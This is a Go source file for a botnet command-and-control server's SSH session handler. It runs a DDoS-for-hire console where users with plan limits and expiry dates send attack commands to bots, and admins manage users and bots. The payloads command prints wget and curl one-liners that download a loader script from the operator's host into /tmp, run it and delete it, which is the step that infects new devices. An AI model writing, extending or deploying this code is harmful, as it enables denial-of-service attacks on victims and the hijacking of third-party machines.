package cnc

import (
	"fmt"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"overbyte-cnc/attack"
	"overbyte-cnc/bot"
	"overbyte-cnc/config"
	"overbyte-cnc/database"
	"overbyte-cnc/logger"
	"overbyte-cnc/theme"
	"overbyte-cnc/ui"

	"github.com/ergochat/readline"
	"golang.org/x/crypto/ssh"
)

type Session struct {
	channel     ssh.Channel
	rl          *readline.Instance
	user        *database.User
	db          *database.Database
	botManager  *bot.Manager
	uiManager   *ui.UIManager
	cfg         *config.Config
	stopTitle   chan struct{}
	connectedAt time.Time
	server      *Server
	attackSvc   *attack.Service
	mu              sync.Mutex
	width           int
	height          int
	sizeChangedFunc func()
}

func NewSession(channel ssh.Channel, user *database.User, db *database.Database, botManager *bot.Manager, uiManager *ui.UIManager, cfg *config.Config, server *Server) *Session {
	s := &Session{
		channel:     channel,
		user:        user,
		db:          db,
		botManager:  botManager,
		uiManager:   uiManager,
		cfg:         cfg,
		stopTitle:   make(chan struct{}),
		connectedAt: time.Now(),
		server:      server,
		attackSvc:   attack.NewService(db, cfg.CNC.MaxGlobalSlots),
		width:       80,
		height:      24,
	}

	rl, err := readline.NewFromConfig(&readline.Config{
		Prompt:         "",
		Stdin:          channel,
		Stdout:         channel,
		Stderr:         channel,
		FuncIsTerminal: func() bool { return true },
		FuncMakeRaw:    func() error { return nil },
		FuncExitRaw:    func() error { return nil },
		FuncGetSize: func() (int, int) {
			s.mu.Lock()
			defer s.mu.Unlock()
			return s.width, s.height
		},
		FuncOnWidthChanged: func(f func()) {
			s.mu.Lock()
			s.sizeChangedFunc = f
			s.mu.Unlock()
		},
	})
	if err != nil {
		logger.Error("Failed to create readline for user %s: %v", user.Username, err)
		channel.Write([]byte("Terminal initialization failed\r\n"))
		return nil
	}
	s.rl = rl
	return s
}

func (s *Session) Close() {
	if s.rl != nil {
		s.rl.Close()
	}
	s.channel.Close()
}

func (s *Session) SetSize(width, height int) {
	s.mu.Lock()
	s.width = width
	s.height = height
	f := s.sizeChangedFunc
	s.mu.Unlock()
	if f != nil {
		f()
	}
}

func (s *Session) Run() {
	defer func() {
		if r := recover(); r != nil {
			logger.Error("Session panic for user %s: %v", s.user.Username, r)
		}
	}()

	go s.titleUpdateLoop()
	defer func() {
		select {
		case <-s.stopTitle:
			// already closed
		default:
			close(s.stopTitle)
		}
	}()

	if s.user.ForcePasswordChange {
		if !s.forcePasswordChange() {
			return
		}
	}

	s.showHome()

	for {
		s.rl.SetPrompt(s.getPrompt())
		line, err := s.rl.ReadLine()
		if err != nil {
			return
		}

		s.channel.Write([]byte("\r\n"))

		cmd := strings.TrimSpace(line)
		if cmd == "" {
			continue
		}

		if !s.handleCommand(cmd) {
			return
		}
	}
}

func (s *Session) forcePasswordChange() bool {
	t := theme.Current()
	s.writeLine("")
	s.writeLine(t.Label("Password Change Required"))
	s.writeLine("")

	newPass, err := s.readPasswordInput(t.Label("New Password") + " ")
	if err != nil || newPass == "" {
		s.writeLine(t.Hint("Cancelled"))
		return false
	}

	confirmPass, err := s.readPasswordInput(t.Label("Confirm Password") + " ")
	if err != nil {
		s.writeLine(t.Hint("Cancelled"))
		return false
	}

	if newPass != confirmPass {
		s.writeLine(t.WarningMsg("Input", "Passwords do not match. Connection closed"))
		return false
	}

	if len(newPass) < 6 {
		s.writeLine(t.WarningMsg("Input", "Password must be at least 6 characters"))
		return false
	}

	if err := s.db.UpdateUserPassword(s.user.ID, newPass); err != nil {
		s.writeLine(t.ErrorMsg("Failed to update password. Please try again later"))
		return false
	}

	s.user.ForcePasswordChange = false
	s.writeLine("")
	s.writeLine(t.Succ("Password changed successfully!"))
	s.writeLine("")
	logger.LogUserAction(s.user.Username, "password_changed_first_login")
	return true
}

func (s *Session) readSimpleLine(prompt string) (string, error) {
	s.rl.SetPrompt(prompt)
	line, err := s.rl.ReadLine()
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(line), nil
}

func (s *Session) readPasswordInput(prompt string) (string, error) {
	s.writePrompt(prompt)
	line, err := s.rl.ReadPassword(prompt)
	s.channel.Write([]byte("\r\n"))
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(string(line)), nil
}

type commandHandler func(*Session, []string) bool

func (s *Session) handleCommand(input string) bool {
	t := theme.Current()
	parts := strings.Fields(input)
	if len(parts) == 0 {
		return true
	}

	cmd := strings.ToLower(parts[0])

	if strings.HasPrefix(cmd, "!attack") {
		args := parts[1:]
		if len(args) > 0 && (args[0] == "disable" || args[0] == "enable") {
			if s.user.Role != "admin" && s.user.Role != "root" {
				s.writeLine(t.ErrorMsg("Permission denied"))
				return true
			}
			enabled := args[0] == "enable"
			s.botManager.SetAttackEnabled(enabled)
			if enabled {
				s.writeLine(t.Succ("Global attacks ENABLED"))
				logger.LogUserAction(s.user.Username, "enabled_global_attacks")
			} else {
				s.writeLine(t.WarningMsg("System", "Global attacks DISABLED"))
				logger.LogUserAction(s.user.Username, "disabled_global_attacks")
			}
			return true
		}
	}

	if strings.HasPrefix(cmd, "!") {
		method := cmd[1:]
		if _, exists := bot.MethodMap[method]; exists {
			s.handleAttack(method, parts[1:])
			return true
		}
	}

	commandMap := map[string]commandHandler{
		"!help":     func(s *Session, args []string) bool { s.showHelp(); return true },
		"!bots":     func(s *Session, args []string) bool { return s.cmdBots(args) },
		"!methods":  func(s *Session, args []string) bool { s.showMethods(); return true },
		"!ongoing":  func(s *Session, args []string) bool { s.showOngoing(); return true },
		"!user":     func(s *Session, args []string) bool { s.showStats(); return true },
		"!plan":     func(s *Session, args []string) bool { s.showPlan(); return true },
		"!clear":    func(s *Session, args []string) bool { s.showHome(); return true },
		"clear":     func(s *Session, args []string) bool { s.showHome(); return true },
		"cls":       func(s *Session, args []string) bool { s.showHome(); return true },
		"!payloads": func(s *Session, args []string) bool { s.handlePayloads(); return true },
		"!exit":     func(s *Session, args []string) bool { return s.cmdExit(args) },
		"!uptime":   func(s *Session, args []string) bool { s.handleUptime(); return true },
		"!passwd":   func(s *Session, args []string) bool { s.handlePasswd(); return true },
		"!last":     func(s *Session, args []string) bool { s.handleLastLogin(); return true },
		"!history":  func(s *Session, args []string) bool { s.handleHistory(args); return true },
		"!stopatk":  func(s *Session, args []string) bool { s.handleStopAttack(args); return true },
	}

	adminCommands := map[string]commandHandler{
		"!admin":      func(s *Session, args []string) bool { s.showAdmin(); return true },
		"!users":      func(s *Session, args []string) bool { s.showUsers(); return true },
		"!adduser":    func(s *Session, args []string) bool { s.handleAddUser(args); return true },
		"!removeuser": func(s *Session, args []string) bool { s.handleDelUser(args); return true },
		"!deluser":    func(s *Session, args []string) bool { s.handleDelUser(args); return true },
		"!edituser":   func(s *Session, args []string) bool { s.handleEditUser(args); return true },
		"!userinfo":   func(s *Session, args []string) bool { s.handleUserInfo(args); return true },
		"!resetpass":  func(s *Session, args []string) bool { s.handleResetPass(args); return true },
		"!sysinfo":    func(s *Session, args []string) bool { s.showSysInfo(); return true },
		"!dumpbots":   func(s *Session, args []string) bool { return s.cmdDumpBots(args) },
		"!logs":       func(s *Session, args []string) bool { s.handleLogs(args); return true },
		"!sessions":   func(s *Session, args []string) bool { s.handleSessions(); return true },
		"!kickuser":   func(s *Session, args []string) bool { s.handleKickUser(args); return true },
		"!ban":        func(s *Session, args []string) bool { s.handleBanUser(args); return true },
		"!unban":      func(s *Session, args []string) bool { s.handleUnbanUser(args); return true },
		"!blacklist":  func(s *Session, args []string) bool { s.handleBlacklist(args); return true },
		"!botstats":   func(s *Session, args []string) bool { s.handleBotStats(); return true },
		"!botinfo":    func(s *Session, args []string) bool { s.handleBotInfo(args); return true },
		"!kickbot":    func(s *Session, args []string) bool { s.handleKickBot(args); return true },
		"!kickbots":   func(s *Session, args []string) bool { s.handleKickBots(); return true },
		"!killbot":    func(s *Session, args []string) bool { s.handleKillBotCmd(args); return true },
		"!sshkey":     func(s *Session, args []string) bool { s.handleSSHKey(args); return true },
	}

	if handler, exists := commandMap[cmd]; exists {
		return handler(s, parts[1:])
	}

	if handler, exists := adminCommands[cmd]; exists {
		if s.isAdmin() {
			return handler(s, parts[1:])
		}
		s.writeLine(t.ErrorMsg("Permission denied"))
		return true
	}

	s.writeLine(t.WarningMsg("Command", fmt.Sprintf("Unknown command '%s'", cmd)))
	return true
}

func (s *Session) handleSSHKey(args []string) {
	t := theme.Current()

	if len(args) == 0 {
		s.writeLine(t.UsageMsg("!sshkey", "show | set <key> | remove"))
		return
	}

	switch args[0] {
	case "show":
		if s.user.SSHPublicKey == "" {
			s.writeLine(t.Inf("No SSH public key registered"))
		} else {
			s.writeLine(t.Label("Your SSH Public Key:"))
			s.writeLine(s.user.SSHPublicKey)
		}
	case "set":
		if len(args) < 2 {
			s.writeLine(t.WarningMsg("Input", "Please provide your public key"))
			return
		}
		key := strings.Join(args[1:], " ")
		if err := s.db.UpdateUserSSHKey(s.user.ID, key); err != nil {
			s.writeLine(t.ErrorMsg("Failed to save SSH key"))
			return
		}
		s.user.SSHPublicKey = key
		s.writeLine(t.Succ("SSH public key saved"))
		logger.LogUserAction(s.user.Username, "set_ssh_key")
	case "remove":
		if err := s.db.UpdateUserSSHKey(s.user.ID, ""); err != nil {
			s.writeLine(t.ErrorMsg("Failed to remove SSH key"))
			return
		}
		s.user.SSHPublicKey = ""
		s.writeLine(t.Succ("SSH public key removed"))
		logger.LogUserAction(s.user.Username, "removed_ssh_key")
	default:
		s.writeLine(t.UsageMsg("!sshkey", "show | set <key> | remove"))
	}
}

func (s *Session) cmdBots(args []string) bool {
	t := theme.Current()
	counts := s.botManager.GetArchCounts()
	total := s.botManager.GetBotCount()
	s.writeLine(t.LabelValue("Total bots", strconv.Itoa(total)))
	if len(counts) > 0 {
		s.writeLine(t.Label("By Architecture:"))
		for arch, count := range counts {
			s.writeLine(fmt.Sprintf("  %s", t.LabelValue(fmt.Sprintf("%-12s", arch), strconv.Itoa(count))))
		}
	}
	return true
}

func (s *Session) cmdExit(args []string) bool {
	t := theme.Current()
	s.writeLine(t.Inf("Goodbye!"))
	logger.LogLogout(s.user.Username, "ssh")
	return false
}

func (s *Session) cmdDumpBots(args []string) bool {
	t := theme.Current()
	bots := s.botManager.GetBotList()
	if len(bots) == 0 {
		s.writeLine(t.Inf("No bots connected"))
	} else {
		widths := []int{22, 14, 10}
		rows := make([][]string, 0, len(bots))
		for _, bot := range bots {
			arch := bot.Arch
			if arch == "" {
				arch = "unknown"
			}
			uptime := time.Since(bot.Connected).Truncate(time.Second)
			rows = append(rows, []string{bot.Addr, arch, uptime.String()})
		}
		s.rl.Write([]byte(RenderTable([]string{"Address", "Arch", "Uptime"}, rows, widths, t)))
	}
	return true
}

func (s *Session) handleAttack(method string, args []string) {
	t := theme.Current()

	if !s.botManager.IsAttackEnabled() {
		s.writeLine(t.ErrorMsg("Attacks are currently disabled globally."))
		return
	}

	isL3 := bot.IsL3Attack(method)
	var target string
	var port, duration int
	var options map[string]string
	var err error

	if isL3 {
		if len(args) < 2 {
			s.writeLine(t.UsageMsg("!method", "ip duration [options]"))
			return
		}
		target = args[0]
		port = 0
		duration, err = strconv.Atoi(args[1])
		if err != nil || duration <= 0 {
			s.writeLine(t.WarningMsg("Input", "Invalid duration"))
			return
		}
		options = attack.ParseOptions(args[2:])
	} else {
		if len(args) < 3 {
			s.writeLine(t.UsageMsg("!method", "ip/domain port duration [options]"))
			return
		}
		target = args[0]
		port, err = strconv.Atoi(args[1])
		if err != nil || port < 0 || port > 65535 {
			s.writeLine(t.WarningMsg("Input", "Invalid port"))
			return
		}
		duration, err = strconv.Atoi(args[2])
		if err != nil || duration <= 0 {
			s.writeLine(t.WarningMsg("Input", "Invalid duration"))
			return
		}
		options = attack.ParseOptions(args[3:])
	}

	refreshedUser, err := s.db.GetUserDetails(s.user.Username)
	if err == nil {
		if refreshedUser.Banned {
			s.writeLine(t.ErrorMsg("Account banned. Connection closed."))
			s.channel.Close()
			return
		}
		if refreshedUser.ExpiryDate.Valid && time.Now().After(refreshedUser.ExpiryDate.Time) {
			s.writeLine(t.ErrorMsg("Account expired. Connection closed."))
			s.channel.Close()
			return
		}
		s.user.DailyUsed = refreshedUser.DailyUsed
	}

	validateBuildStart := time.Now()
	result, err := s.attackSvc.ValidateAndBuild(s.user, method, target, port, duration, options)
	validateBuildElapsed := time.Since(validateBuildStart)
	if err != nil {
		s.writeLine(t.ErrorMsg(err.Error()))
		return
	}

	for _, w := range result.Warnings {
		s.writeLine(t.WarningMsg("Option", w))
	}

	maxBots := 0
	if s.user.Role != "root" && s.user.MaxBots > 0 {
		maxBots = s.user.MaxBots
	}

	sendStart := time.Now()
	var sent int
	if maxBots > 0 {
		sent = s.botManager.BroadcastToN(result.Payload, maxBots)
	} else {
		sent = s.botManager.BroadcastCommand(result.Payload)
	}
	sendElapsed := time.Since(sendStart)
	totalElapsed := validateBuildElapsed + sendElapsed

	s.db.IncrementDailyUsed(s.user.ID)
	s.user.DailyUsed++

	logger.LogAttack(s.user.Username, result.Method, result.TargetIP, result.TargetPort, result.Duration)

	buildTimeStr := formatBuildTime(validateBuildElapsed, sendElapsed, totalElapsed)
	vars := map[string]string{
		"method":     result.Method,
		"target":     result.TargetIP,
		"port":       strconv.Itoa(result.TargetPort),
		"duration":   strconv.Itoa(result.Duration),
		"bots_sent":  strconv.Itoa(sent),
		"build_time": buildTimeStr,
	}
	if s.uiManager.HasScreen("attacksent") {
		s.writeLine(s.uiManager.GetScreen("attacksent", vars))
	} else {
		s.writeLine(t.Succ(fmt.Sprintf("Attack sent to %d bots", sent)))
		s.writeLine(t.Inf(fmt.Sprintf("Target: %s:%d | Duration: %ds | Method: %s", result.TargetIP, result.TargetPort, result.Duration, result.Method)))
	}
}

func (s *Session) showHome() {
	vars := map[string]string{
		"username":    s.user.Username,
		"role":        s.user.Role,
		"bots":        strconv.Itoa(s.botManager.GetBotCount()),
		"daily_used":  strconv.Itoa(s.user.DailyUsed),
		"daily_limit": s.formatLimit(s.user.DailyLimit),
	}
	if s.uiManager.HasScreen("home") {
		s.writeLine(s.uiManager.GetScreen("home", vars))
	}
}

func (s *Session) showHelp() {
	t := theme.Current()
	if s.uiManager.HasScreen("help") {
		s.writeLine(s.uiManager.GetScreen("help", nil))
	} else {
		s.writeLine(t.Inf("=== Commands ==="))
		s.writeLine("  " + t.Succ("bots") + "     - Show online bot count")
		s.writeLine("  " + t.Succ("methods") + "  - List attack methods")
		s.writeLine("  " + t.Succ("ongoing") + "  - Show all running attacks")
		s.writeLine("  " + t.Succ("running") + "  - Show your running attacks")
		s.writeLine("  " + t.Succ("stats") + "    - Show your stats")
		s.writeLine("  " + t.Succ("stop") + "     - Stop all attacks")
		s.writeLine("  " + t.Succ("clear") + "    - Clear screen")
		s.writeLine("  " + t.Succ("exit") + "     - Logout")
	}
}

func (s *Session) showMethods() {
	t := theme.Current()
	if s.uiManager.HasScreen("methods") {
		s.writeLine(s.uiManager.GetScreen("methods", nil))
	} else {
		s.writeLine(t.Inf("Available Methods:"))
		for _, method := range bot.GetMethods() {
			s.writeLine("  " + method)
		}
	}
}

func (s *Session) showOngoing() {
	t := theme.Current()
	attacks, err := s.db.GetOngoingAttacks()
	if err != nil {
		s.writeLine(t.ErrorMsg("Failed fetching attacks"))
		return
	}

	if len(attacks) == 0 {
		s.writeLine(t.Inf("No ongoing attacks"))
		return
	}

	if s.uiManager.HasScreen("ongoing_header") {
		s.writeLine(s.uiManager.GetScreen("ongoing_header", nil))
	}

	t = theme.Current()
	widths := []int{6, 10, 15, 8, 8, 10, 10}
	rows := make([][]string, 0, len(attacks))
	for _, atk := range attacks {
		portStr := "-"
		if atk.Port > 0 {
			portStr = strconv.Itoa(atk.Port)
		}
		rows = append(rows, []string{
			strconv.Itoa(atk.ID),
			atk.Method,
			atk.Target,
			portStr,
			strconv.Itoa(atk.Duration),
			strconv.Itoa(atk.TimeLeft),
			atk.Username,
		})
	}
	s.rl.Write([]byte(RenderTable([]string{"ID", "Method", "Target", "Port", "Time", "TimeLeft", "User"}, rows, widths, t)))
}

func (s *Session) showStats() {
	t := theme.Current()
	vars := map[string]string{
		"username":    s.user.Username,
		"role":        s.user.Role,
		"max_time":    s.formatLimit(s.user.MaxTime),
		"max_bots":    s.formatLimit(s.user.MaxBots),
		"max_slots":   s.formatLimit(s.user.MaxSlots),
		"daily_used":  strconv.Itoa(s.user.DailyUsed),
		"daily_limit": s.formatLimit(s.user.DailyLimit),
	}

	if s.uiManager.HasScreen("stats") {
		s.writeLine(s.uiManager.GetScreen("stats", vars))
	} else {
		s.writeLine(t.Inf("=== Your Stats ==="))
		s.writeLine(t.LabelValue("  Username", s.user.Username))
		s.writeLine(t.LabelValue("  Role", s.user.Role))

		if s.user.Role == "root" {
			s.writeLine(t.LabelValue("  Max Time", "∞"))
			s.writeLine(t.LabelValue("  Max Bots", "∞"))
			s.writeLine(t.LabelValue("  Max Slots", "∞"))
			s.writeLine(t.LabelValue("  Daily Limit", "∞"))
		} else {
			s.writeLine(t.LabelValue("  Max Time", fmt.Sprintf("%d seconds", s.user.MaxTime)))
			s.writeLine(t.LabelValue("  Max Bots", strconv.Itoa(s.user.MaxBots)))
			s.writeLine(t.LabelValue("  Max Slots", strconv.Itoa(s.user.MaxSlots)))
			s.writeLine(t.LabelValue("  Daily", fmt.Sprintf("%d/%d", s.user.DailyUsed, s.user.DailyLimit)))
		}
	}
}

func (s *Session) showPlan() {
	t := theme.Current()
	vars := map[string]string{
		"max_time":    s.formatLimit(s.user.MaxTime),
		"max_bots":    s.formatLimit(s.user.MaxBots),
		"max_slots":   s.formatLimit(s.user.MaxSlots),
		"daily_used":  strconv.Itoa(s.user.DailyUsed),
		"daily_limit": s.formatLimit(s.user.DailyLimit),
		"api_access":  strconv.FormatBool(s.user.APIAccess),
	}

	if s.uiManager.HasScreen("plan") {
		s.writeLine(s.uiManager.GetScreen("plan", vars))
	} else {
		s.writeLine(t.Label("\n Your Plan:"))
		s.writeLine(t.LabelValue("  Max Attack Time", s.formatLimit(s.user.MaxTime)+" seconds"))
		s.writeLine(t.LabelValue("  Max Bots", s.formatLimit(s.user.MaxBots)+" bots"))
		s.writeLine(t.LabelValue("  Max Slots", s.formatLimit(s.user.MaxSlots)+" concurrent attacks"))
		s.writeLine(t.LabelValue("  Daily Limit", fmt.Sprintf("%d/%s attacks today", s.user.DailyUsed, s.formatLimit(s.user.DailyLimit))))
		s.writeLine(t.LabelValue("  API Access", strconv.FormatBool(s.user.APIAccess)))
	}
}

func (s *Session) showAdmin() {
	t := theme.Current()
	if s.uiManager.HasScreen("admin") {
		s.writeLine(s.uiManager.GetScreen("admin", nil))
	} else {
		s.writeLine(t.Label("\n Admin Commands:"))
		s.writeLine(t.LabelValue("  !adduser", "add new user"))
		s.writeLine(t.LabelValue("  !removeuser", "remove user"))
		s.writeLine(t.LabelValue("  !kickuser", "kick user from server"))
		s.writeLine(t.LabelValue("  !users", "list all users"))
		s.writeLine(t.LabelValue("  !kickbots", "kick all bots"))
		s.writeLine(t.LabelValue("  !dumpbots", "dump bot list"))
		s.writeLine(t.LabelValue("  !sysinfo", "show system info"))
		s.writeLine(t.LabelValue("  !sshkey", "manage SSH public keys"))
	}
}

func (s *Session) showSysInfo() {
	t := theme.Current()
	var m runtime.MemStats
	runtime.ReadMemStats(&m)

	s.writeLine(t.Label(" System Information:"))
	s.writeLine(t.LabelValue("  Goroutines", strconv.Itoa(runtime.NumGoroutine())))
	s.writeLine(t.LabelValue("  Alloc", fmt.Sprintf("%d KB", m.Alloc/1024)))
	s.writeLine(t.LabelValue("  TotalAlloc", fmt.Sprintf("%d KB", m.TotalAlloc/1024)))
	s.writeLine(t.LabelValue("  Sys", fmt.Sprintf("%d KB", m.Sys/1024)))
	s.writeLine(t.LabelValue("  NumGC", strconv.Itoa(int(m.NumGC))))
	s.writeLine(t.LabelValue("  Protocol", "SSH (Encrypted)"))
}

func (s *Session) showUsers() {
	t := theme.Current()
	users, err := s.db.GetAllUsers()
	if err != nil {
		s.writeLine(t.ErrorMsg("Failed fetching users"))
		return
	}

	widths := []int{5, 15, 8, 8, 8, 6, 10, 12}
	rows := make([][]string, 0, len(users))
	for _, u := range users {
		maxTimeStr := s.formatLimit(u.MaxTime)
		maxBotsStr := s.formatLimit(u.MaxBots)
		maxSlotsStr := s.formatLimit(u.MaxSlots)
		dailyLimitStr := s.formatLimit(u.DailyLimit)
		dailyStr := fmt.Sprintf("%d/%s", u.DailyUsed, dailyLimitStr)
		expiryStr := "never"
		if u.ExpiryDate.Valid {
			expiryStr = u.ExpiryDate.Time.Format("2006-01-02")
		}
		rows = append(rows, []string{
			fmt.Sprintf("%d", u.ID),
			u.Username,
			u.Role,
			maxTimeStr,
			maxBotsStr,
			maxSlotsStr,
			dailyStr,
			expiryStr,
		})
	}
	s.rl.Write([]byte(RenderTable([]string{"ID", "Username", "Role", "MaxTime", "MaxBots", "Slots", "Daily", "Expiry"}, rows, widths, t)))
}

// writeLine writes a line to the connection. Errors are silently ignored
// since a failed write means the connection is dead and will be caught
// by the next Read.
func (s *Session) writeLine(msg string) {
	s.rl.Write([]byte(msg + "\r\n"))
}

func (s *Session) writePrompt(msg string) {
	s.rl.Write([]byte(msg))
}

func (s *Session) getPrompt() string {
	vars := map[string]string{
		"username": s.user.Username,
		"role":     s.user.Role,
	}
	if prompt := s.uiManager.GetScreen("prompt", vars); prompt != "" {
		return strings.TrimRight(prompt, "\r\n")
	}
	t := theme.Current()
	return fmt.Sprintf("\001\033[%sm\002[%s@reaperx]# \001\033[0m\002", t.Prompt, s.user.Username)
}

func (s *Session) isAdmin() bool {
	return s.user.Role == "admin" || s.user.Role == "root"
}

func (s *Session) formatLimit(val int) string {
	if val == 0 {
		return "∞"
	}
	return strconv.Itoa(val)
}

// formatBuildTime formats timing breakdown with precision (µs/ms/s).
func formatBuildTime(validateBuild, send, total time.Duration) string {
	f := func(d time.Duration) string {
		if d < time.Millisecond {
			return fmt.Sprintf("%dµs", d.Microseconds())
		}
		if d < time.Second {
			return fmt.Sprintf("%.2fms", float64(d.Nanoseconds())/1e6)
		}
		return fmt.Sprintf("%.2fs", d.Seconds())
	}
	return fmt.Sprintf("validateBuild: %s | send: %s | total: %s", f(validateBuild), f(send), f(total))
}

func (s *Session) parseUnlimitedInt(input string, defaultVal int) int {
	input = strings.TrimSpace(strings.ToLower(input))
	if input == "" {
		return defaultVal
	}
	if input == "0" || input == "u" || input == "unlimited" {
		return 0
	}
	val, err := strconv.Atoi(input)
	if err != nil || val < 0 {
		return defaultVal
	}
	return val
}

func (s *Session) titleUpdateLoop() {
	// Update every 3 seconds instead of 1 to reduce DB load
	ticker := time.NewTicker(3 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-s.stopTitle:
			return
		case <-ticker.C:
			select {
			case <-s.stopTitle:
				return
			default:
			}

			botCount := s.botManager.GetBotCount()
			slotsInUse, err := s.db.GetGlobalSlotsInUse()
			if err != nil {
				slotsInUse = 0
			}

			slotsMax := "∞"
			if s.cfg.CNC.MaxGlobalSlots > 0 {
				slotsMax = strconv.Itoa(s.cfg.CNC.MaxGlobalSlots)
			}

			attacksMax := "∞"
			if s.user.DailyLimit > 0 {
				attacksMax = strconv.Itoa(s.user.DailyLimit)
			}

			expiryStr := "∞"
			if s.user.ExpiryDate.Valid {
				expiryStr = s.user.ExpiryDate.Time.Format("2006-01-02")
			}
			title := fmt.Sprintf("\033]0;Bots : %d | Slots : %d/%s | Attacks : %d/%s | Expiry : %s\007", botCount, slotsInUse, slotsMax, s.user.DailyUsed, attacksMax, expiryStr)
			s.channel.Write([]byte(title))
		}
	}
}

func (s *Session) handlePayloads() {
	t := theme.Current()
	if !s.cfg.Payload.Enabled {
		s.writeLine(t.ErrorMsg("Payload delivery is disabled."))
		return
	}

	port := s.cfg.Payload.Port
	if port == 0 {
		port = s.cfg.API.Port
	}

	path := "/payload/"
	if s.cfg.Payload.HiddenPath != "" {
		path += s.cfg.Payload.HiddenPath + "/"
	}

	loader := s.cfg.Payload.LoaderName
	if loader == "" {
		loader = "payload"
	}
	loader += ".sh"

	host := s.cfg.Payload.Host
	if host == "" {
		host = "[YOUR_IP]"
	}
	url := fmt.Sprintf("http://%s:%d%s%s", host, port, path, loader)

	ua := s.cfg.Payload.UserAgent

	s.writeLine(t.Label("\n Payload Delivery Commands:"))
	s.writeLine(t.LabelValue("  Wget", fmt.Sprintf("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q -U '%s' -O %s %s; sh %s; rm -rf %s", ua, loader, url, loader, loader)))
	s.writeLine(t.LabelValue("  Curl", fmt.Sprintf("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -s -A '%s' -o %s %s; sh %s; rm -rf %s", ua, loader, url, loader, loader)))
	s.writeLine("")
}
